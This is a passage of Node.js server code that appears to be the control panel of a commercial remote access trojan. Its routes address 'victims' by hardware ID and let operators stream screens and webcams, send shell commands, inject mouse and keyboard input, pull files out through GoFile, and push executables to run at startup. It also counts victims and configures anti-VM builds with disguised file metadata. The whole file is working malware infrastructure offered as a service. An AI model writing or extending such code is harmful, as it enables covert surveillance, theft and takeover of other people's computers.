            res.json({ success: true, message: `AntiVM option updated to: ${AntiVM}` });
        } else {
            res.json({ success: false, message: 'No document matched the provided key.' });
        }
    } catch (error) {
        console.error('Error updating AntiVM option:', error);
        res.status(500).json({ success: false, message: 'Error updating AntiVM option.' });
    }
});

app.get('/dashboard/user', async (req, res) => {
    if (!req.session.isAuthenticated) {
        return res.redirect('/user/login');
    }

    const key = req.session.key;

    try {
        console.log(`🔍 Searching for key: ${key}`); 

        const check = await keysCollection.findOne({ key: key });

        const allKeys = await keysCollection.find({}).toArray();
        const totalVictims = allKeys.reduce((sum, item) => sum + (item.hwids ? item.hwids.length : 0), 0);

        if (!check) {
            console.log(`⚠️ No document matched for key: ${key}`);
            return res.render('dashboard', { 
                key: key, 
                fileName: 'Not set',
                companyName: 'Not set',
                fileDescription: 'Not set',
                tgtoken: 'Not set',
                webhook: 'Not set',
                buildOption: 'Not set',
                AntiVM: 'Not set',
                logType: 'Not set',
                chatId: 'Not set',
                downloadLink: 'Not found.',
                iconStatus: '❎ (No icon uploaded)',
                createdAt: 'Not available',
                expiresAt: 'Not available',
                membershipInfo: 'Not available',
                alertMessage: `⚠️ No data found for the key: ${key}`,
                hwidCount: 0,
                rank: 'N/A',
                totalVictims: totalVictims
            });
        }

        const fileName = check.productName || 'Not set';
        const companyName = check.companyName || 'Not set';
        const fileDescription = check.fileDescription || 'Not set';
        const tgtoken = check.tgtoken || 'Not set';
        const webhook = check.webhook || 'Not set';
        const buildOption = check.buildOption || 'Not set';
        const AntiVM = check.AntiVM || 'Not set';
        const logType = check.logType || 'Not set';
        const chatId = check.chatid || 'Not set';
        const downloadLink = check.lastLink || 'Not found.';
        const iconStatus = fs.existsSync(path.join(__dirname, `../icons/${key}.ico`)) ? `✅ (Icon exists)` : `❎ (No icon uploaded)`;
        const hwidCount = check.hwids ? check.hwids.length : 0;

        const sortedKeys = allKeys.sort((a, b) => (b.hwids?.length || 0) - (a.hwids?.length || 0));
        const rank = sortedKeys.findIndex(item => item.key === key) + 1;

        const createdAt = check.createdAt ? moment(check.createdAt).format('MMMM Do YYYY, h:mm:ss a') : 'Not available';
        let expiresAt = 'Lifetime';
        if (check.expiresAt) {
            const expiresMoment = moment(check.expiresAt);
            const now = moment();
            const duration = moment.duration(expiresMoment.diff(now));
            const days = Math.floor(duration.asDays());
            const hours = duration.hours();
            const minutes = duration.minutes();
            const seconds = duration.seconds();
            expiresAt = `${days}d ${hours}h ${minutes}m ${seconds}s`;
        }

        const membershipkey = `${key}`;
        const memberships = `${createdAt}`;
        const membershipe = `${expiresAt}`;

        res.render('dashboard', { 
            key: key, 
            fileName: fileName,
            companyName: companyName,
            fileDescription: fileDescription,
            tgtoken: tgtoken,
            webhook: webhook,
            buildOption: buildOption,
            AntiVM: AntiVM,
            logType: logType,
            chatId: chatId,
            downloadLink: downloadLink,
            iconStatus: iconStatus,
            createdAt: createdAt,
            expiresAt: expiresAt,
            membershipkey: membershipkey,
            memberships: memberships,
            membershipe: membershipe,
            hwidCount: hwidCount,
            rank: rank,
            totalVictims: totalVictims,
            alertMessage: `✅ Document loaded successfully for key: ${key}`
        });
    } catch (error) {
        console.error('❌ Error retrieving data:', error);
        res.render('dashboard', {
            key: key,
            fileName: 'Error',
            companyName: 'Error',
            fileDescription: 'Error',
            tgtoken: 'Error',
            webhook: 'Error',
            buildOption: 'Error',
            AntiVM: 'Error',
            logType: 'Error',
            chatId: 'Error',
            downloadLink: 'Error',
            iconStatus: '❌ Error loading icon status',
            createdAt: 'Error',
            expiresAt: 'Error',
            membershipkey: 'Error retrieving membership info',
            memberships: 'Error retrieving membership info',
            membershipe: 'Error retrieving membership info',
            hwidCount: 'Error',
            rank: 'Error',
            totalVictims: 0,
            alertMessage: `❌ Error retrieving data for key: ${key}`
        });
    }
});

app.post('/api/manage-log-settings', async (req, res) => {
    const { key, logType } = req.body;
    try {
        const result = await keysCollection.updateOne(
            { key: key },
            { $set: { logType: logType } }
        );

        if (result.matchedCount > 0) {
            res.json({ success: true, message: `Log Type updated to: ${logType}` });
        } else {
            res.json({ success: false, message: 'No document matched the provided key.' });
        }
    } catch (error) {
        console.error('Error updating Log Type:', error);
        res.status(500).json({ success: false, message: 'Error updating Log Type.' });
    }
});

app.post('/api/start-build', async (req, res) => {
    const { key } = req.body;
    try {
        const check = await keysCollection.findOne({ key: key });

        if (!check?.logType) {
            return res.json({ success: false, message: 'Please select a Log Type via BUILD SETTINGS menu.' });
        }

        const response = await axios.post(`http://localhost:1331/build/${key}`);

        if (response.data.success) {
            return res.json({ success: true, message: 'Build completed! - Download link will be sent to the Log Type you set.' });
        } else {
            return res.json({ success: false, message: `Build failed: ${response.data.error}` });
        }
    } catch (error) {
        console.error('error build:', error);
        return res.status(500).json({ success: false, message: 'ERROR - CONTACT ADMIN' });
    }
});

function checkHwid(req, res, next) {
    const hwid = req.params.hwid;
    if (!clients[hwid]) {
        return res.redirect(rickrollUrl);
    }
    next();
}

function isHwidActive(hwid) {
    return !!clients[hwid];
}

app.get('/panel/user/hwids', async (req, res) => {
    if (!req.session.isAuthenticated) {
        return res.redirect('/user/login');
    }

    const key = req.session.key;

    try {
        const check = await keysCollection.findOne({ key: key });
        const allHwids = check.hwids || [];

        const activeHwids = allHwids.filter(hwid => isHwidActive(hwid));
        const offlineHwids = allHwids.filter(hwid => !isHwidActive(hwid));
        const totalHwids = allHwids.length;

        res.render('hwidcontrol', { activeHwids, offlineHwids, totalHwids });
    } catch (error) {
        res.status(500).json({ success: false, error: 'Error retrieving HWIDs' });
    }
});

app.post('/panel/user/stopAllStreams', (req, res) => {
    for (const hwid in screenTimers) {
        if (screenTimers[hwid]) {
            clearTimeout(screenTimers[hwid]);
            delete screenTimers[hwid];
        }
    }
    io.emit('stopStream');
    res.json({ success: true });
});

app.get('/victims/:hwid/Panel', checkHwid, (req, res) => {
    const hwid = req.params.hwid;
    res.render('victimshome', { hwid: hwid });
});

app.get('/victims/:hwid/selectpath', (req, res) => {
    const hwid = req.params.hwid;
    res.render('selectpath', { hwid });
});

app.get('/victims/:hwid/filedownload/:path', (req, res) => {
    const hwid = req.params.hwid;
    const path = req.params.path;
    
    if (clients[hwid]) {
        console.log(`Fetching file list for HWID: ${hwid} at path: ${path}`);
        clients[hwid].emit('fetchFileList', path); 
        
        clients[hwid].once('fileList', (data) => {
            const files = data.files; 
            console.log('Received file list:', files);
            
            res.render('filedownload', { hwid, path, files });
        });
    } else {
        res.status(404).send('Client not connected.');
    }
});

app.post('/victims/:hwid/wallpaper', upload.single('image'), (req, res) => {
    const hwid = req.params.hwid;
    const imagePath = path.join(__dirname, 'uploads', hwid, req.file.filename);

    if (clients[hwid]) {
        console.log(`Sending wallpaper file to client with HWID: ${hwid}`);
        const imageData = fs.readFileSync(imagePath);
        const base64Image = Buffer.from(imageData).toString('base64');
        clients[hwid].emit('setWallpaper', { filename: req.file.filename, data: base64Image });
        res.status(200).send({ message: 'Wallpaper uploaded and change command sent successfully' });
    } else {
        console.log(`Client with HWID: ${hwid} not found`);
        res.status(404).send({ message: 'Client not found' });
    }
});

app.get('/victims/:hwid/wallpaper', (req, res) => {
    const hwid = req.params.hwid;
    res.render('wallpaper', { hwid });
});

app.post('/victims/:hwid/download', (req, res) => {
    const { files } = req.body;
    const randomString = crypto.randomBytes(8).toString('hex');
    const zipPath = path.join(__dirname, 'downloads', `${randomString}.zip`);
    const output = fs.createWriteStream(zipPath);
    const archive = archiver('zip', {
        zlib: { level: 9 }
    });

    output.on('close', () => {
        res.download(zipPath, `${randomString}.zip`, (err) => { 
            if (err) {
                console.error('Error sending file:', err);
            }
            fs.unlinkSync(zipPath);
        });
    });

    archive.on('error', (err) => {
        throw err;
    });

    archive.pipe(output);

    files.forEach((file) => {
        const stats = fs.statSync(file);
        if (stats.isDirectory()) {
            archive.directory(file, path.basename(file));
        } else {
            archive.file(file, { name: path.basename(file) }); 
        }
    });

    archive.finalize();
});

app.get('/victims/:hwid/screenviewer', checkHwid, (req, res) => {
    const hwid = req.params.hwid;
    res.render('stream', { hwid });
});

app.post('/victims/:hwid', checkHwid, (req, res) => {
    const hwid = req.params.hwid;
    const command = req.body.command;

    if (clients[hwid]) {
        console.log(`Sending command to client with HWID: ${hwid}`);
        clients[hwid].emit('command', command);
        res.status(200).send({ message: 'Command sent successfully' });
    } else {
        console.log(`Client with HWID: ${hwid} not found`);
        res.status(404).send({ message: 'Client not found' });
    }
});

app.post('/victims/:hwid/cmd', checkHwid, (req, res) => {
    const hwid = req.params.hwid;
    const command = req.body.command;

    if (clients[hwid]) {
        console.log(`Sending CMD command to client with HWID: ${hwid}`);
        clients[hwid].emit('cmd', command);
        res.status(200).send({ message: 'CMD command sent successfully' });
    } else {
        console.log(`Client with HWID: ${hwid} not found`);
        res.status(404).send({ message: 'Client not found' });
    }
});

app.post('/victims/:hwid/music', checkHwid, upload.single('music'), (req, res) => {
    const hwid = req.params.hwid;
    const musicPath = path.join(__dirname, 'uploads', hwid, req.file.filename);

    if (clients[hwid]) {
        console.log(`Sending music file to client with HWID: ${hwid}`);
        const musicData = fs.readFileSync(musicPath);
        const base64Music = Buffer.from(musicData).toString('base64');
        clients[hwid].emit('playMusic', { filename: req.file.filename, data: base64Music });
        res.status(200).send({ message: 'Music uploaded and play command sent successfully' });
    } else {
        console.log(`Client with HWID: ${hwid} not found`);
        res.status(404).send({ message: 'Client not found' });
    }
});

app.post('/victims/:hwid/alert', checkHwid, (req, res) => {
    const hwid = req.params.hwid;
    const { title, content } = req.body;

    if (clients[hwid]) {
        console.log(`Sending alert to client with HWID: ${hwid}`);
        clients[hwid].emit('alert', { title, content });
        res.status(200).send({ message: 'Alert sent successfully' });
    } else {
        console.log(`Client with HWID: ${hwid} not found`);
        res.status(404).send({ message: 'Client not found' });
    }
});

app.get('/victims/:hwid/controlpanel', checkHwid, (req, res) => {
    const hwid = req.params.hwid;
    res.render('controlpanel', { hwid });
});

app.post('/victims/:hwid/controlpanel', checkHwid, (req, res) => {
    const hwid = req.params.hwid;
    const action = req.body.action;

    if (clients[hwid]) {
        console.log(`Sending control action to client with HWID: ${hwid}`);
        clients[hwid].emit('cmd', action);
        res.status(200).send({ message: 'Control action sent successfully' });
    } else {
        console.log(`Client with HWID: ${hwid} not found`);
        res.status(404).send({ message: 'Client not found' });
    }
});

app.get('/victims/:hwid/newlogs', checkHwid, (req, res) => {
    const hwid = req.params.hwid;
    res.render('newlogs', { hwid });
});

app.post('/victims/:hwid/newlogsping', checkHwid, (req, res) => {
    const hwid = req.params.hwid;

    if (clients[hwid]) {
        console.log(`Sending newlogs req to client with HWID: ${hwid}`);
        clients[hwid].emit('newlogsping');
        res.status(200).send({ message: 'newlogs req sent successfully' });
    } else {
        console.log(`Client with HWID: ${hwid} not found`);
        res.status(404).send({ message: 'Client not found' });
    }
});

app.get('/victims/:hwid/cmd', checkHwid, (req, res) => {
    const hwid = req.params.hwid;
    res.render('cmd', { hwid });
});

app.get('/victims/:hwid/music', checkHwid, (req, res) => {
    const hwid = req.params.hwid;
    res.render('music', { hwid });
});

app.get('/victims/:hwid/alert', checkHwid, (req, res) => {
    const hwid = req.params.hwid;
    res.render('alert', { hwid });
});

app.get('/victims/:hwid/chat', checkHwid, (req, res) => {
    const hwid = req.params.hwid;
    res.render('chat_victim', { hwid });
});

app.get('/Victim/:hwid', checkHwid, (req, res) => {
    const hwid = req.params.hwid;
    res.render('chat_client', { hwid });
});

app.get('/victims/:hwid/uploadexe', (req, res) => {
    const hwid = req.params.hwid;
    res.render('uploadexe', { hwid });
});

app.get('/victims/:hwid/cam', (req, res) => {
    const hwid = req.params.hwid;
    console.log(`Accessing camera for HWID: ${hwid}`);
    res.render('cam', { hwid });
});

io.on('connection', (socket) => {
    console.log('A client connected:', socket.id);

    socket.on('register', ({ hwid, screenWidth, screenHeight }) => {
        clients[hwid] = socket;
        screenSizes[hwid] = { screenWidth, screenHeight };
        if (!chat[hwid]) {
            chat[hwid] = [];
        }
        console.log(`Client registered with HWID: ${hwid}, screen size: ${screenWidth}x${screenHeight}`);
    });

    socket.on('camera_frame', ({ hwid, frame }) => {
        console.log(`Frame received from HWID: ${hwid}`);
        const dir = path.join(__dirname, `public/webcams/${hwid}`);

        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
        }

        const filePath = path.join(dir, 'screenshot.png');
        const decompressed = zlib.gunzipSync(frame);

        fs.writeFileSync(filePath, decompressed); 
        console.log(`Screenshot saved to ${filePath}`);
    });

    socket.on('start_camera', (hwid) => {
        if (!clients[hwid]) {
            console.error(`HWID ${hwid} için bir client bulunamadı.`);
            return socket.emit('error', 'HWID bulunamadı veya kayıtlı değil.');
        }
        console.log(`Viewer başlatıldı: HWID ${hwid}`);

        clients[hwid].emit('start_camera');

        if (screenTimers[hwid]) clearTimeout(screenTimers[hwid]);

        screenTimers[hwid] = setTimeout(() => {
            if (clients[hwid]) {
                clients[hwid].emit('stop_camera');
                console.log(`HWID ${hwid} için Viewer 10 dakika sonra durduruldu.`);
            }
        }, 10 * 60 * 1000);
    });

    socket.on('stop_camera', (hwid) => {
        if (!clients[hwid]) {
            console.error(`HWID ${hwid} için bir client bulunamadı.`);
            return socket.emit('error', 'HWID bulunamadı veya kayıtlı değil.');
        }
        console.log(`Viewer durduruldu: HWID ${hwid}`);

        clients[hwid].emit('stop_camera');
        if (screenTimers[hwid]) clearTimeout(screenTimers[hwid]);
    });

    socket.on('disconnect', () => {
        for (const hwid in clients) {
            if (clients[hwid] === socket) {
                delete clients[hwid];
                delete screenSizes[hwid];
                if (screenTimers[hwid]) {
                    clearTimeout(screenTimers[hwid]);
                    delete screenTimers[hwid];
                }
                console.log(`Client with HWID: ${hwid} disconnected`);
                break;
            }
        }
    });

    socket.on('fetchFolderContents', ({ hwid, path }) => {
        if (clients[hwid]) {
            console.log(`Fetching folder contents for HWID: ${hwid} at path: ${path}`);
    
            fs.readdir(path, { withFileTypes: true }, async (err, files) => {
                if (err) {
                    console.error(`Error reading folder: ${err.message}`);
                    return;
                }
    
                const folderContents = await Promise.all(files.map(async (file) => {
                    const fullPath = pathModule.join(path, file.name);
                    
                    if (file.isDirectory()) {
                        return {
                            name: file.name,
                            path: fullPath,
                            isDirectory: true,
                            size: 'x', 
                            subFiles: []
                        };
                    } else {
                        const size = await getFileSize(fullPath);
                        return {
                            name: file.name,
                            path: fullPath,
                            isDirectory: false,
                            size
                        };
                    }
                }));
    
                socket.emit('folderContents', { path, files: folderContents });
            });
        }
    });
    
    function getFileSize(filePath) {
        return new Promise((resolve, reject) => {
            fs.stat(filePath, (err, stats) => {
                if (err) {
                    return reject(err);
                }
                if (stats.isDirectory()) {
                    resolve('x'); 
                } else {
                    resolve(`${(stats.size / 1024).toFixed(2)} KB`);
                }
            });
        });
    }

    socket.on('downloadExe', ({ hwid, exeLink }) => {
        console.log(`Received downloadExe request from HWID: ${hwid}, Link: ${exeLink}`);
        
        const targetSocket = clients[hwid];
        if (targetSocket) {
            console.log(`Emitting downloadExe to client with HWID: ${hwid}`);
            targetSocket.emit('downloadExe', { exeLink });
        } else {
            console.log(`No client found with HWID: ${hwid}`);
        }
    });
    
    socket.on('downloadExeStartup', ({ hwid, exeLink }) => {
        console.log(`Received downloadExeStartup request from HWID: ${hwid}, Link: ${exeLink}`);
        
        const targetSocket = clients[hwid];
        if (targetSocket) {
            console.log(`Emitting downloadExeStartup to client with HWID: ${hwid}`);
            targetSocket.emit('downloadExeStartup', { exeLink });
        } else {
            console.log(`No client found with HWID: ${hwid}`);
        }
    });

    socket.on('fetchFileList', ({ hwid, path }) => {
        if (clients[hwid]) {
            clients[hwid].emit('fetchFileList', path); 
        }
    });

    socket.on('startDownload', (data) => {
        const { hwid, files } = data;
        console.log(`Download request received for HWID: ${hwid}, Files: ${files}`);
        const targetSocket = clients[hwid];
        
        if (targetSocket) {
            targetSocket.emit('zipAndUpload', { hwid, files });
    
            targetSocket.once('uploadComplete', (gofileLink) => {
                console.log('GoFile link received:', gofileLink);
                
                socket.emit('downloadLink', gofileLink);
            });
        } else {
            console.log(`No client found with HWID: ${hwid}`);
        }
    });

    socket.on('fileList', ({ hwid, files }) => {
        io.to(hwid).emit('fileList', { files });
    });

    socket.on('message', (data) => {
        const { hwid, message, sender } = data;
    
        if (!clients[hwid]) {
            return socket.emit('error', 'HWID not registered');
        }
    
        console.log(`Message from client ${socket.id}:`, data);
    
        if (chat[hwid]) {
            chat[hwid].push({ sender, message });
            io.to(hwid).emit('chatMessage', { sender, message });
    
            clients[hwid].emit('playSound', { sound: '/sounds/facebook.mp3.mp3' });
    
            if (sender === 'victim') {
                io.to(hwid).emit('playSound', { sound: '/sounds/facebook2.mp3' });
            } else {
                clients[hwid].emit('playSound', { sound: '/sounds/facebook2.mp3' });
            }
        }
    });

    app.use('/sounds', express.static(path.join(__dirname, 'sounds')));

    socket.on('commandResult', (data) => {
        const { hwid, result } = data;
        if (!clients[hwid]) {
            return socket.emit('error', 'HWID not registered');
        }
        console.log(`Command result from client ${hwid}:`, result);
        io.to(hwid).emit('commandOutput', result);
    });

    socket.on('screenData', (data) => {
        const { hwid, data: screenData } = data;
        if (!clients[hwid]) {
            return socket.emit('error', 'HWID not registered');
        }
        try {
            const decompressed = brotli.decompress(Buffer.from(screenData));
            io.to(hwid).emit('screenData', decompressed);
        } catch (error) {
            console.error('Decompression error:', error);
            socket.emit('error', 'Failed to decompress screen data');
        }
    });

    socket.on('signal', (data) => {
        const { hwid, signal } = data;
        if (!clients[hwid]) {
            return socket.emit('error', 'HWID not registered');
        }
        if (clients[hwid]) {
            console.log(`Forwarding signal data to client ${hwid}`);
            clients[hwid].emit('signal', signal);
        }
    });

    socket.on('startStream', (hwid) => {
        try {
            if (!clients[hwid]) {
                console.error(`HWID ${hwid} için bir client bulunamadı.`);
                return socket.emit('error', 'HWID bulunamadı veya kayıtlı değil.');
            }
            console.log(`Stream başlatıldı: HWID ${hwid}`);
    
            clients[hwid].emit('startStream');
            
            if (screenTimers[hwid]) {
                clearTimeout(screenTimers[hwid]);
            }
    
            screenTimers[hwid] = setTimeout(() => {
                if (clients[hwid]) {
                    clients[hwid].emit('stopStream');
                    console.log(`HWID ${hwid} için stream 10 dakika sonra durduruldu.`);
                }
            }, 10 * 60 * 1000); 
    
        } catch (error) {
            console.error(`Stream başlatma hatası HWID ${hwid}:`, error);
            socket.emit('error', 'Stream başlatılırken bir hata oluştu.');
        }
    });
    
    socket.on('stopStream', (hwid) => {
        if (!clients[hwid]) {
            return socket.emit('error', 'HWID bulunamadı veya kayıtlı değil.');
        }
        console.log(`Stream durduruldu: HWID ${hwid}`);
        
        clients[hwid].emit('stopStream');
    
        if (screenTimers[hwid]) {
            clearTimeout(screenTimers[hwid]);
            delete screenTimers[hwid];
        }
    });
    
    socket.on('mouseMove', (data) => {
        const { hwid, x, y } = data;
        if (!clients[hwid]) {
            return socket.emit('error', 'HWID not registered');
        }
        if (clients[hwid]) {
            const screenSize = screenSizes[hwid];
            if (screenSize) {
                const realX = (x / 640) * screenSize.screenWidth;
                const realY = (y / 360) * screenSize.screenHeight;
                clients[hwid].emit('mouseMove', { x: realX, y: realY });
            }
        }
    });

    socket.on('mouseClick', (data) => {
        const { hwid, x, y } = data;
        if (!clients[hwid]) {
            return socket.emit('error', 'HWID not registered');
        }
        if (clients[hwid]) {
            const screenSize = screenSizes[hwid];
            if (screenSize) {
                const realX = (x / 640) * screenSize.screenWidth;
                const realY = (y / 360) * screenSize.screenHeight;
                clients[hwid].emit('mouseClick', { x: realX, y: realY });
            }
        }
    });

    socket.on('keyPress', (data) => {
        const { hwid, key } = data;
        if (!clients[hwid]) {
            return socket.emit('error', 'HWID not registered');
        }
        if (clients[hwid]) {
            clients[hwid].emit('keyPress', key);
        }
    });

    socket.on('joinRoom', (hwid) => {
        if (!clients[hwid]) {
            return socket.emit('error', 'HWID not registered');
        }
        socket.join(hwid);
        if (chat[hwid]) {
            socket.emit('chatHistory', chat[hwid]);
        }
        console.log(`Client ${socket.id} joined room for HWID: ${hwid}`);
    });

    socket.on('bringClient', (hwid) => {
        if (!clients[hwid]) {
            return socket.emit('error', 'HWID not registered');
        }
        const clientUrl = `https://${apiurl}/victim/${hwid}`;
        clients[hwid].emit('openUrl', clientUrl);
    });
});

if (!fs.existsSync('uploads')) {
    fs.mkdirSync('uploads');
}

if (!fs.existsSync('downloads')) {
    fs.mkdirSync('downloads');
}

const UPLOADS_DIR = path.join(__dirname, 'uploads');

function clearUploadsFolder() {
    console.log(`${new Date().toLocaleString()}: Uploads klasörü temizleniyor...`);

    fs.readdir(UPLOADS_DIR, (err, files) => {
        if (err) {
            return console.log(`Klasör okunurken hata oluştu: ${err.message}`);
        }

        files.forEach(file => {
            const filePath = path.join(UPLOADS_DIR, file);

            fs.stat(filePath, (err, stats) => {
                if (err) {
                    return console.log(`Stat hatası: ${err.message}`);
                }

                if (stats.isFile()) {
                    fs.unlink(filePath, err => {
                        if (err) {
                            return console.log(`Dosya silinirken hata oluştu: ${err.message}`);
                        }
                        console.log(`Dosya silindi: ${filePath}`);
                    });
                } else if (stats.isDirectory()) {
                    fs.rmdir(filePath, { recursive: true }, err => {
                        if (err) {
                            return console.log(`Klasör silinirken hata oluştu: ${err.message}`);
                        }
                        console.log(`Klasör silindi: ${filePath}`);
                    });
                }
            });
        });
    });
}

setInterval(() => {
    const currentTime = new Date();
    if (currentTime.getMinutes() === 0) {
        clearUploadsFolder();
    }
}, 60 * 1000); 


  server.listen(667, () => {
    console.log(`Listening on port 667`);
    mongoose.connect(config.mongodb, {
      useNewUrlParser: true,
      useUnifiedTopology: true,
    })
    .then(() => console.log('Mongoose connection successful.'))
    .catch(() => console.log('Mongoose connection error.'));
  });
  

client.connect().then(() => {
    console.log('Connected to MongoDB successfully.');
}).catch(err => {
    console.error('MongoDB connection error:', err);
});

